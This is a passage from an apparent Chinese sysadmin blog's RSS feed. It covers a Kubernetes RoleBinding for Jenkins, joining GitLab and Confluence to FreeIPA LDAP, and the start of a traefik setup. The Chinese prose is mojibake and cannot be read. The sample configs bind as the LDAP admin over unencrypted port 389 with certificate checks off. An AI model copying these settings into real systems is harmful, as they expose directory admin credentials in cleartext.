&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;roleRef:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  apiGroup: rbac.authorization.k8s.io
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  kind: Role
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  name: jenkins
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;subjects:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- kind: ServiceAccount
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  name: jenkins-admin
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  namespace: default
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;èµ„æºçš„é“¾æ¥ï¼šhttps://kubernetes.io/zh-cn/docs/reference/access-authn-authz/rbac/&lt;/p&gt;</description>
    </item>
    <item>
      <title>Gitlabé›†æˆè¿›freeIPAè¿›è¡Œç»Ÿä¸€è®¤è¯</title>
      <link>https://rendoumi.com/posts/20230217-freeipa_gitlab/</link>
      <pubDate>Fri, 17 Feb 2023 09:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20230217-freeipa_gitlab/</guid>
      <description>&lt;p&gt;æ¥ä¸Šä¸€ç¯‡ï¼ŒFreeipaæ¥å®Œconfluenceï¼Œæ¥ä¸‹æ¥æ˜¯æ¥å…¥Gitlab.&lt;/p&gt;
&lt;p&gt;å…ˆä¸‹ç»“è®ºï¼šåŒæ ·é“ç†ï¼Œä¹Ÿæ˜¯å­˜åœ¨å…ˆæœ‰ Gitlab è´¦æˆ·ã€ç„¶åæ‰æœ‰çš„ FreeIPA LDAP ç›®å½•ï¼Œè¿™ä¹Ÿä¸è¦ç´§ï¼Œå› ä¸º Gitlab åŒæ ·æ”¯æŒ LDAP è®¤è¯æ–¹å¼çš„ç”¨æˆ·ä¸ç°æœ‰ç”¨æˆ·è¿›è¡Œåˆå¹¶ã€‚&lt;/p&gt;
&lt;p&gt;ä¸¾ä¸ªä¾‹å­ï¼Œå¦‚æœæˆ‘å·²ç»åœ¨ Gitlab ä¸­åˆ›å»ºäº†ç”¨æˆ·åä¸º zhangranruiã€é‚®ç®±ä¸º &lt;a href=&#34;mailto:zhangranrui@rendoumi.com&#34;&gt;zhangranrui@rendoumi.com&lt;/a&gt; çš„ç”¨æˆ·ï¼Œé‚£ä¹ˆæˆ‘åœ¨ LDAP ç›®å½•ä¸­åªéœ€è¦æŠŠ mail å­—æ®µä¹Ÿå†™æˆ &lt;a href=&#34;mailto:zhangranrui@rendoumi.com&#34;&gt;zhangranrui@rendoumi.com&lt;/a&gt; å³å¯è¢« Gitlab è¯†åˆ«æˆåŒä¸€ç”¨æˆ·ã€‚æˆ–è€…è¯´ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ Gitlab ä¸­å¢åŠ  LDAP ç›®å½•ä¸­çš„ mail å­—æ®µçš„é‚®ç®±ï¼ˆGitlab æ”¯æŒåŒä¸€ç”¨æˆ·ç»‘å®šå¤šä¸ªé‚®ç®±ï¼‰ï¼Œè¿™æ ·åœ¨ Gitlab ä¸­ä½¿ç”¨ LDAP è®¤è¯çš„æ—¶å€™ä¹Ÿä¼šè¢«è§†ä¸ºåŒä¸€ç”¨æˆ·ã€‚è·Ÿ Confluence æ˜¯ä¸€æ¨¡ä¸€æ ·çš„ã€‚&lt;/p&gt;
&lt;p&gt;æ³¨æ„ï¼šè¿™æ ·æ”¹äº†ä¹‹åï¼Œæ— è®ºç™»å½•æˆ–æ˜¯æ‹‰å–ä»£ç ï¼Œå°±åªèƒ½ä½¿ç”¨LDAPçš„è´¦å·å¯†ç ï¼Œä¸èƒ½ä½¿ç”¨æ—§çš„ GitLab Standard çš„è´¦å·ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬çš„ Gitlab ç‰ˆæœ¬æ¯”ä»·è€11.1.0ï¼Œæ‰€ä»¥æ”¹çš„æ˜¯ gitlab.yml&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  ldap:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    enabled: &lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    servers:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      main: &lt;span class=&#34;c1&#34;&gt;# &amp;#39;main&amp;#39; is the GitLab &amp;#39;provider ID&amp;#39; of this LDAP server&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        label: &lt;span class=&#34;s1&#34;&gt;&amp;#39;LDAP&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        host: &lt;span class=&#34;s1&#34;&gt;&amp;#39;freeipa.bybon.cn&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        port: &lt;span class=&#34;m&#34;&gt;389&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        uid: &lt;span class=&#34;s1&#34;&gt;&amp;#39;uid&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        encryption: &lt;span class=&#34;s1&#34;&gt;&amp;#39;plain&amp;#39;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# &amp;#34;start_tls&amp;#34; or &amp;#34;simple_tls&amp;#34; or &amp;#34;plain&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        verify_certificates: &lt;span class=&#34;nb&#34;&gt;false&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        ca_file: &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        ssl_version: &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        bind_dn: &lt;span class=&#34;s1&#34;&gt;&amp;#39;uid=admin,cn=users,cn=accounts,dc=bybon,dc=cn&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        password: &lt;span class=&#34;s1&#34;&gt;&amp;#39;xxxxxx&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        timeout: &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        active_directory: &lt;span class=&#34;nb&#34;&gt;false&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        allow_username_or_email_login: &lt;span class=&#34;nb&#34;&gt;false&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        block_auto_created_users: &lt;span class=&#34;nb&#34;&gt;false&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        base: &lt;span class=&#34;s1&#34;&gt;&amp;#39;dc=bybon,dc=cn&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        user_filter: &lt;span class=&#34;s1&#34;&gt;&amp;#39;(&amp;amp;(objectclass=inetorgperson)(memberOf=cn=gitlab-users,cn=groups,cn=accounts,dc=bybon,dc=cn))&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        attributes:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          username: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;uid&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          email:    &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;mail&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          name:       &lt;span class=&#34;s1&#34;&gt;&amp;#39;displayName&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          first_name: &lt;span class=&#34;s1&#34;&gt;&amp;#39;givenName&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          last_name:  &lt;span class=&#34;s1&#34;&gt;&amp;#39;sn&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          lowercase_usernames: &lt;span class=&#34;nb&#34;&gt;false&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ–°ç‰ˆæœ¬çš„è¯ï¼ŒæŒ‰å­—æ®µæ¯”è¾ƒå³å¯ã€‚æ³¨æ„ä¸Šé¢ï¼Œæˆ‘æ˜¯æå‰å»ºç«‹äº†ä¸€ä¸ª gitlab-users çš„ç»„ï¼ŒæŠŠç”¨æˆ·å…ˆéƒ½æ”¾è¿›ç»„é‡Œï¼Œè¿™æ ·æ–¹ä¾¿ç®¡ç†ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>Confluenceé›†æˆè¿›freeIPAè¿›è¡Œç»Ÿä¸€è®¤è¯</title>
      <link>https://rendoumi.com/posts/20230216-freeipa_confluence/</link>
      <pubDate>Thu, 16 Feb 2023 09:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20230216-freeipa_confluence/</guid>
      <description>&lt;p&gt;å…¬å¸å†³å®šç”¨ç»Ÿä¸€ç”¨æˆ·ç®¡ç†ç³»ç»Ÿï¼Œé‚£å¿…ç„¶æ˜¯å¾®è½¯çš„ AD å’Œå¼€æºçš„ LDAP äºŒé€‰ä¸€äº†&lt;/p&gt;
&lt;p&gt;è‡ªç„¶ç”¨ Freeipa ä½œä¸ºé¦–é€‰ã€‚&lt;/p&gt;
&lt;p&gt;èŠ±æ—¶é—´ä»”ç»†è°ƒç ”äº†ä¸€ä¸‹ï¼Œå…ˆè¯´ç»“è®ºï¼š&lt;/p&gt;
&lt;p&gt;å¦‚æœ confluence å·²ç»æœ‰å¾ˆå¤šç”¨æˆ·ï¼Œé‚£ä¹ˆå¯¹ä¸èµ·ï¼Œè¿™äº›ç”¨æˆ·çš„å¯†ç éƒ½å¿…é¡»é€šçŸ¥åˆ°ä¸ªäººï¼Œå¼ºåˆ¶è¿›è¡Œä¿®æ”¹ï¼Œæ—§æœ‰çš„å¯†ç å®Œå…¨æ— æ³•å¯¼å‡ºï¼ˆé™¤éä¸€ä¸ªä¸€ä¸ªäººé—®å‡ºæ¥ï¼‰ã€‚&lt;/p&gt;
&lt;p&gt;confluence å®é™…ä¸Šæ˜¯ç”¨äº†ä¸€ä¸ªå†…ç½®çš„ç›®å½•è½¯ä»¶æ¥ç®¡ç†ç”¨æˆ·çš„ï¼Œç”¨æˆ·å”¯ä¸€å­˜åœ¨çš„å‡­æ®å°±æ˜¯é‚®ç®±ã€‚&lt;/p&gt;
&lt;p&gt;confluence æ”¯æŒåŒæ—¶ä»å¤šä¸ªç›®å½•æ ‘ä¸­æŒ‰ç…§é¡ºåºæ¥æŸ¥è¯¢ç”¨æˆ·ï¼ŒæŸ¥è¯¢åˆ°çš„ç»“æœä¼šåˆå¹¶ã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œæ’ç¬¬ä¸€çš„ç›®å½•æ ‘æ˜¯freeipaï¼Œæ’ç¬¬äºŒä½çš„ç›®å½•æ ‘æ˜¯å†…ç½®ç›®å½•ï¼Œä¸¤ä¸ªç›®å½•æ ‘éƒ½æœ‰ä¸€ä¸ªç”¨æˆ·ï¼Œä¸¤æ¡è®°å½•çš„é‚®ä»¶æ˜¯ä¸€è‡´çš„ï¼Œé‚£ä¹ˆä¼šåœ¨æ’ç¬¬ä¸€çš„ freeipa æ ‘ä¸­è®¤è¯ç”¨æˆ·ï¼Œä½†ä¼šæŠŠä¸¤ä¸ªç›®å½•æ ‘ä¸­ç”¨æˆ·çš„ä¿¡æ¯æ‹¼æ¥åˆå¹¶èµ·æ¥æ€»ä½“è¿”å›ã€‚&lt;/p&gt;
&lt;p&gt;è¿™æ ·å°±æ˜ç™½äº†æŠŠï¼Œæˆ‘ä»¬åªç”¨ç¬¬ä¸€ä¸ª freeipa ç›®å½•æ ‘æ¥è®¤è¯ç”¨æˆ·ï¼ŒåŸæœ‰çš„ç»„æƒé™è¿˜æ˜¯ç”¨ç¬¬äºŒä¸ªå†…ç½®ç›®å½•æ ‘ä¸­çš„ä¿¡æ¯ï¼Œä¿æŒä¸¤æ£µæ ‘ä¸­ç”¨æˆ·çš„ mail ä¿æŒä¸€è‡´å³å¯ï¼Œæ­¥éª¤å¦‚ä¸‹ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬é¦–å…ˆè¦æå‰åœ¨freeIPAé‡Œé¢å»ºç«‹ä¸¤ä¸ªç»„ï¼š&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;confluence-administrators&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;confluence-users&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20230216171408006&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20230216-freeipa_confluence/image-20230216171408006.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åè·‘åˆ° Confluence é‡Œï¼Œç”¨æˆ·ç›®å½•ï¼Œæ·»åŠ ä¸€ä¸ª freeipa çš„ç›®å½•æœåŠ¡æ”¾åœ¨å‰é¢&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20230216171611828&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20230216-freeipa_confluence/image-20230216171611828.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;è¯¦ç»†é…ç½®çš„å‚æ•°å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;é…ç½®å¦‚ä¸‹ï¼š
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Server Settings:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- Namel: freeipa
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- Directory Type: OpenLDAP
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- Server: example.com
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- Port: &lt;span class=&#34;m&#34;&gt;389&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- Use SLL: &lt;span class=&#34;nb&#34;&gt;false&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- Username: &lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;admin,cn&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;users,cn&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;accounts,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;bybon,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;cn
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- Password: &amp;lt;insert password here&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;LDAP Schema:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- Base DN: &lt;span class=&#34;nv&#34;&gt;dc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;bybon,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;cn
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- Additional User DN: &lt;span class=&#34;nv&#34;&gt;cn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;users,cn&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;accounts
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- Additional Group DN:cn&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;groups,cn&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;accounts
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;LDAP Permissions:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Select Read/Write
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Advanced Settings: Default
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;User Schema Settings
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- User Object Class: inetorgperson
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- User Object Filter: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;objectclass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;inetorgperson&lt;span class=&#34;o&#34;&gt;)(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;memberOf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;cn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;confluence-users,cn&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;groups,cn&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;accounts,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;bybon,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;cn&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- User Name Attribute: uid
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- User Name RDN Attribute: uid
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- User First Name Attribute: giveName
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- User Last Name Attribute: sn
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- User Display Name Attribute: displayName
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- User Email Attribute: mail
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- User Password Attribute: userPassword
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- User Password Encryption: SHA
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- User Unique ID Attribute: uid
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Group Schema Settings
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- Group Object Class: groupofnames &lt;span class=&#34;c1&#34;&gt;# all lowercase&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- Group Object Filter: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;objectclass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;groupofnames&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# all lowercase&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- Group Name Attribute: cn
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- Group Description Attribute: description
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Membership Schema Settings
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- Group Members Attribute: member &lt;span class=&#34;c1&#34;&gt;#lowercase&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- User Membership Attribute:memberOf
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ”¾å…¨ä¸­æ–‡çš„å›¾å¦‚ä¸‹ï¼š&lt;/p&gt;</description>
    </item>
    <item>
      <title>traefikè‡ªåŠ¨ç­¾å‘å¹¶ç»­è´¹è¯ä¹¦&#43;ç«¯å£è½¬å‘</title>
      <link>https://rendoumi.com/posts/20230131-traefik_certificate/</link>
      <pubDate>Tue, 31 Jan 2023 09:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20230131-traefik_certificate/</guid>
      <description>&lt;p&gt;nginxå’Œtraefikéƒ½å¯ä»¥åšingressï¼Œåœ¨å…¥å£å¤„åšè¯ä¹¦çš„å¸è½½ï¼Œå¹¶è½¬å‘tcpã€udpã€httpsã€httpæµé‡&lt;/p&gt;
&lt;p&gt;nginxæ˜¯æ¯”è¾ƒé€šå¸¸çš„åšæ³•ï¼Œtraefiké…ç½®æ¯”è¾ƒç®€å•ï¼Œå°¤å…¶æ˜¯é…ç½®è‡ªåŠ¨ç»­ç­¾çš„è¯ä¹¦&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;wget https://github.com/traefik/traefik/releases/download/v2.4.8/traefik_v2.4.8_linux_amd64.tar.gz
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;è§£å‹é‡Šæ”¾å‡ºæ¥traefikæ–‡ä»¶ï¼Œå»ºç«‹ç›®å½•/export/servers/traefik&lt;/p&gt;
&lt;p&gt;ç»“æ„å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20230131-traefik_certificate/2021-07-21_100638.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;traefik.yml&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;log:
  level: DEBUG

api:
  insecure: false
